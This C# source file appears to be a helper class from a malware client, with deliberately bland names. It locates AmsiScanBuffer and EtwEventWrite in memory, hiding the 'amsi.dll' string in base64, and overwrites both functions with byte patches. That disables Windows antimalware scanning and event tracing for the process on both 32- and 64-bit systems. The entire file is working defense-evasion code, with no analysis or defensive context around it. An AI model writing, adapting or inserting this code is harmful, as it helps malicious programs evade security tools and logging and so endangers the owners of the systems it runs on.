using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace Client.Helper;

public class A
{
	private static byte[] x64_etw_patch = new byte[4] { 72, 51, 192, 195 };

	private static byte[] x86_etw_patch = new byte[5] { 51, 192, 194, 20, 0 };

	private static byte[] x64_am_si_patch = new byte[6] { 184, 87, 0, 7, 128, 195 };

	private static byte[] x86_am_si_patch = new byte[8] { 184, 87, 0, 7, 128, 194, 24, 0 };

	private static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
	{
		IntPtr intPtr = IntPtr.Zero;
		try
		{
			int num = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 60));
			Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + num + 20));
			long num2 = ModuleBase.ToInt64() + num + 24;
			short num3 = Marshal.ReadInt16((IntPtr)num2);
			long num4 = 0L;
			num4 = ((num3 != 267) ? (num2 + 112) : (num2 + 96));
			int num5 = Marshal.ReadInt32((IntPtr)num4);
			int num6 = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + num5 + 16));
			Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + num5 + 20));
			int num7 = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + num5 + 24));
			int num8 = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + num5 + 28));
			int num9 = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + num5 + 32));
			int num10 = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + num5 + 36));
			for (int i = 0; i < num7; i++)
			{
				if (Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + num9 + i * 4)))).Equals(ExportName, StringComparison.OrdinalIgnoreCase))
				{
					int num11 = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + num10 + i * 2)) + num6;
					int num12 = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + num8 + 4 * (num11 - num6)));
					intPtr = (IntPtr)((long)ModuleBase + num12);
					break;
				}
			}
		}
		catch
		{
			throw new InvalidOperationException("Failed to parse module exports.");
		}
		if (intPtr == IntPtr.Zero)
		{
			throw new MissingMethodException(ExportName + " not found.");
		}
		return intPtr;
	}

	private static string decode(string b64encoded)
	{
		return Encoding.ASCII.GetString(Convert.FromBase64String(b64encoded));
	}

	private static void PatchMem(byte[] patch, string library, string function)
	{
		try
		{
			IntPtr processHandle = new IntPtr(-1);
			IntPtr BaseAddress = GetExportAddress((from ProcessModule x in Process.GetCurrentProcess().Modules
				where library.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)
				select x).FirstOrDefault().BaseAddress, function);
			IntPtr RegionSize = new IntPtr(patch.Length);
			uint OldProtect = 0u;
			DInvokeCore.NtProtectVirtualMemory(processHandle, ref BaseAddress, ref RegionSize, 64u, ref OldProtect);
			Marshal.Copy(patch, 0, BaseAddress, patch.Length);
		}
		catch (Exception ex)
		{
			Console.WriteLine(" [!] {0}", ex.Message);
			Console.WriteLine(" [!] {0}", ex.InnerException);
		}
	}

	private static void Patcham_si(byte[] patch)
	{
		string text = decode("YW1zaS5kbGw=");
		foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
		{
			if (module.ModuleName == text)
			{
				PatchMem(patch, text, "AmsiScanBuffer");
			}
		}
	}

	private static void PatchETW(byte[] Patch)
	{
		PatchMem(Patch, "ntdll.dll", "EtwEventWrite");
	}

	public static void B()
	{
		if (IntPtr.Size != 4)
		{
			Patcham_si(x64_am_si_patch);
			PatchETW(x64_etw_patch);
		}
		else
		{
			Patcham_si(x86_am_si_patch);
			PatchETW(x86_etw_patch);
		}
	}
}
